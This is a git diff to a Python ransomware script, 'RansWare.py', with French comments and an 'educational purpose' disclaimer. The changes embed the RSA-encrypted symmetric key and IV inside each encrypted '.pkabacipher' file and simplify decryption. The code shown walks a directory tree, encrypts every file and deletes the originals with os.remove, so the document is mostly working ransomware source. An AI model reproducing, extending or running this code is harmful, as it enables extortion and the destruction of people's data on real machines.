@@ -3,7 +3,7 @@ Coded By Alexis Pondo
 Github: http://github.com/alexispondo/
 Linkedin: https://www.linkedin.com/in/alexis-pondo/
 
-Note: Ce programe est à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
+Note: Ce programe est destiné à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
       Je ne suis en aucun cas reponsable de tous ce que vous ferez avec.
 
 Usage:
@@ -11,6 +11,9 @@ Usage:
     python3 RansWare.py enc --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --pub_key /home/alexispondo/HACK_LOG/PERSO/ransomware/public
     python3 RansWare.py dec --dir "/home/alexispondo/Téléchargements/bibliothequePHP-master (copie 1)" --priv_key /home/alexispondo/HACK_LOG/PERSO/ransomware/private --mdp /home/alexispondo/HACK_LOG/PERSO/ransomware/password
 
+Attention !!!:
+    Il ne sert à rien de chiffrer un fichier plusieurs fois (ex: evitez les chiffrement du genre: text.pkabacipher.pkabacipher)
+    Une erreur pourrais apparaitre lors du deuxième dechiffrement !!!
 """
 
 from cryptography.hazmat.primitives import serialization
@@ -122,9 +125,11 @@ def sym_cipher_data(file, public_key, key_mdp):
         )
     )
     # On sauvegarde le resultat dans un fichier
-    with open("password", "wb") as key:
-        key.write(ciphertext_pass)
+    #with open("password", "wb") as key:
+    #    key.write(ciphertext_pass)
     #############################################################
+    # Rectification on enregistre plus le mdp chiffré dans un autre fichier mais plus tôt dans le fichier contenant l'information à dechiffrer pour nous permettre de chiffrer/dechiffrer un fichier plusieurs fois
+
 
     ## On chiffre assimetriquement le vecteur d'initialisation avec la clé publique
     #ciphertext_iv = pub_k.encrypt(
@@ -147,8 +152,8 @@ def sym_cipher_data(file, public_key, key_mdp):
     # On crypte la donné recupérer à l'aide de notre chiffreur
     data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()
 
-    # on ajoute le vecteur d'initialisation au fichier
-    data_and_init_vector = data_crypte + b"pkabacipher" + init_v
+    # on ajoute le vecteur d'initialisation et le mot de passe chiffré au fichier
+    data_and_init_vector = data_crypte + b"pkabacipher" + init_v + b"pkabacipher" + ciphertext_pass
 
     # On sauvegarde l'information chiffré dans un fichier portant le même nom en y ajoutant l'extention ".pkabacipher"
     new_file = file + ".pkabacipher"
@@ -158,18 +163,36 @@ def sym_cipher_data(file, public_key, key_mdp):
     # On suprime l'ancien fichier
     os.remove(file)
 
-# Fonction de dechiffrement symetrique il prend en paramètre le fichier chiffré, le password chiffré et la clé privée
-def sym_decipher_data(file_cipher, key_cipher,  private_key):
+# Fonction de dechiffrement symetrique il prend en paramètre le fichier chiffré et la clé privée
+def sym_decipher_data(file_cipher, private_key):
     # On charge la clé privée
     priv_k = load_private_key(private_key)
 
-    # On ouvre le fichier chiffrer symetriquement contenant en son sein le vecteur d'initialisation
+    # On ouvre le fichier chiffrer symetriquement contenant en son sein le vecteur d'initialisation et le mdp chiffré
     with open(file_cipher, "rb") as f:
         file_and_init = f.read()
 
+
+
+    # On recupere chaque partie du fichier chiffrer
+    #plaintext_iv = b"".join(file_and_init.split(b"pkabacipher")[-1]) # L evecteur d'initialisation pour ce fichier chiffrer
+    plaintext_iv = file_and_init.split(b"pkabacipher")[1] # L evecteur d'initialisation pour ce fichier chiffrer
+    #file = b"".join(file_and_init.split(b"pkabacipher")[:-1]) # Le contenu du fichier chiffrer
+    file = file_and_init.split(b"pkabacipher")[0] # Le contenu du fichier chiffrer
+    key = file_and_init.split(b"pkabacipher")[2]
+    #print(plaintext_iv)
+    #print(type(plaintext_iv))
+    #print(file)
+    #print(type(file))
+
+
     ## On déchiffre le mot de passe qui sera utilisé pour le dechiffrement symetrique
-    with open(key_cipher, "rb") as k:  # On ouvre la clé (mdp symetrique) chiffré asymetriquement par la clé publique
-        key = k.read()
+    #with open(key_cipher, "rb") as k:  # On ouvre la clé (mdp symetrique) chiffré asymetriquement par la clé publique
+    #    key = k.read()
+
+    #Plus besoin de recupérer le fichier de mot de passe puis ce qu'il se trouve dans le fichier contenant les infos cryptés
+
+
     plaintext_key = priv_k.decrypt(
         key,
         padding.OAEP(
@@ -179,17 +202,6 @@ def sym_decipher_data(file_cipher, key_cipher,  private_key):
         )
     )
     #######################################################################
-
-    # On recupere chaque partie du fichier chiffrer
-    #plaintext_iv = b"".join(file_and_init.split(b"pkabacipher")[-1]) # L evecteur d'initialisation pour ce fichier chiffrer
-    plaintext_iv = file_and_init.split(b"pkabacipher")[1] # L evecteur d'initialisation pour ce fichier chiffrer
-    #file = b"".join(file_and_init.split(b"pkabacipher")[:-1]) # Le contenu du fichier chiffrer
-    file = file_and_init.split(b"pkabacipher")[0] # Le contenu du fichier chiffrer
-    #print(plaintext_iv)
-    #print(type(plaintext_iv))
-    #print(file)
-    #print(type(file))
-
 
     ## On déchiffre le vecteur d'initialisation qui sera utilisé pour le chiffrement symetrique
     #with open(iv_cipher, "rb") as iv:  # On ouvre le vecteur d'initailisation chiffré asymetriquement par la clé privée
@@ -351,7 +363,7 @@ def crypter(dir, public_key_file, mdp):
     else:
         print("\nDésolé vous avez entrez un dossier inexistant :(")
 
-def decrypter(dir, private_key_file, mdp):
+def decrypter(dir, private_key_file):#, mdp):
     if os.path.isdir(dir):
         for (current_dir, list_dir, files) in os.walk(dir):
             for f in files:
@@ -367,7 +379,8 @@ def decrypter(dir, private_key_file, mdp):
                     print_blue("Ancien = {}".format(path_file))
                     try:
                         #dech(private_key, path_file)
-                        sym_decipher_data(path_file, mdp, private_key_file)
+                        #sym_decipher_data(path_file, mdp, private_key_file)
+                        sym_decipher_data(path_file, private_key_file)
                         path_file_c = ".".join(str(path_file).split(".")[:-1])
                         print_green("Nouveau = {}".format(path_file_c))
                     except Exception as e:
@@ -403,7 +416,7 @@ enc.add_argument("--pub_key", type=str, required=True, help="Spécifier le chemi
 
 dec.add_argument("--dir", type=str, required=True, help="Spécifier le chemin du repertoire à partir duquel commencer le decryptage") # Spécifier le dossier racine de dechiffrement
 dec.add_argument("--priv_key", type=str, required=True, help="Spécifier le chemin de la clé privée l'ors du decryptage") # Spécifier la clé privée pour le dechiffrement
-dec.add_argument("--mdp", type=str, required=True, help="Spécifier le chemin du fichier de mot de passe l'ors du decryptage") # Spécifier le fichier de mot de passe pour le dechiffrement
+#dec.add_argument("--mdp", type=str, required=True, help="Spécifier le chemin du fichier de mot de passe l'ors du decryptage") # Spécifier le fichier de mot de passe pour le dechiffrement
 
 args = parser.parse_args()
 print_yellow_bold(banner())
@@ -435,6 +448,6 @@ elif args.command == 'enc':
 elif args.command == 'dec':
     dir = args.dir
     priv_key = args.priv_key
-    mdp = args.mdp
-    decrypter(dir,priv_key,mdp)
+    #mdp = args.mdp
+    decrypter(dir,priv_key)#,mdp)
     #print('dir= ', args.dir , "priv_key= ", args.priv_key )
